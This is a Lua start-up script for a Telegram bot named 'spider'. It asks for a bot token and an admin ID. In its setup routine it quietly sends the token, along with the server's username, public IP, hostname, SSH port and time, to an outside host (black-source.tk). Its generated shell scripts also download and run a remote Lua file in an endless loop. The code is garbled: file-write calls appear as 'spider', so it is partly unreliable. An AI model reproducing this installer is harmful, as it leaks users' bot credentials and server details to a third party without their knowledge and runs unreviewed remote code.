database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
serpent = dofile("./File_Libs/serpent.lua")
JSON    = dofile("./File_Libs/dkjson.lua")
json    = dofile("./File_Libs/JSON.lua")
URL = dofile("./File_Libs/url.lua")
https = require("ssl.https")
http = require("socket.http")
Server_Done = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
User = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
IP = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
Name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
Port = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
Time = io.popen("date +'%Y/%m/%d %T'"):read('*a'):gsub('[\n\r]+', '')
local AutoFiles_spider = function() 
local Create_Info = function(Token,Sudo)  
local spider_Info_Sudo = io.open("sudo.lua", 'w')
spider_Info_Sudo:spider([[
token = "]]..Token..[["

Sudo = ]]..Sudo..[[  

]])
spider_Info_Sudo:close()
end  
if not database:get(Server_Done.."Token_spider") then
print("\27[1;34m»» Send Your Token Bot :\27[m")
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.spider('\n\27[1;31mSorry The Token is not Correct \n\27[0;39;49m')
else
io.spider('\n\27[1;31mThe Token Is Saved\n\27[0;39;49m')
database:set(Server_Done.."Token_spider",token)
end 
else
io.spider('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
if not database:get(Server_Done.."UserSudo_spider") then
print("\27[1;34mSend Your Id Sudo :\27[m")
local Id = io.read():gsub(' ','') 
if tostring(Id):match('%d+') then
data,res = https.request("https://black-source.tk/BlackTeAM/index.php?bn=info&id="..Id)
if res == 200 then
muaed = json:decode(data)
if muaed.Info.info == 'Is_Spam' then
io.spider('\n\27[1;31mSorry The Id Is Prohibited From The Source\n\27[0;39;49m')
os.execute('lua start.lua')
end ---ifBn
if muaed.Info.info == 'Ok' then
io.spider('\n\27[1;31m The Id Is Saved\n\27[0;39;49m')
database:set(Server_Done.."UserSudo_spider",Id)
end ---ifok
else
io.spider('\n\27[1;31mThe Id was not Saved\n\27[0;39;49m')
end  ---ifid
os.execute('lua start.lua')
end ---ifnot
end
local function Files_Info_Get()
Create_Info(database:get(Server_Done.."Token_spider"),database:get(Server_Done.."UserSudo_spider"))   
local t = json:decode(https.request('https://black-source.tk/BlackTeAM/index.php?n=BK&id='..database:get(Server_Done.."UserSudo_spider").."&token="..database:get(Server_Done.."Token_spider").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
print("::Black::")
local RunBot = io.open("spider", 'w')
RunBot:spider([[
#!/usr/bin/env bash
cd $HOME/spider
token="]]..database:get(Server_Done.."Token_spider")..[["
rm -fr spider.lua
wget "https://raw.githubusercontent.com/spidersr/spider/master/spider.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./spider.lua -p PROFILE --bot=$token
done
]])
RunBot:close()
local RunTs = io.open("ts", 'w')
RunTs:spider([[
#!/usr/bin/env bash
cd $HOME/spider
while(true) do
rm -fr ../.telegram-cli
screen -S spider -X kill
screen -S spider ./spider
done
]])
RunTs:close()
end
Files_Info_Get()
database:del(Server_Done.."Token_spider");database:del(Server_Done.."UserSudo_spider")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
end 
local function Load_File()  
local f = io.open("./sudo.lua", "r")  
if not f then   
AutoFiles_spider()  
var = true
else   
f:close()  
database:del(Server_Done.."Token_spider");database:del(Server_Done.."UserSudo_spider")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
var = false
end  
return var
end
Load_File()
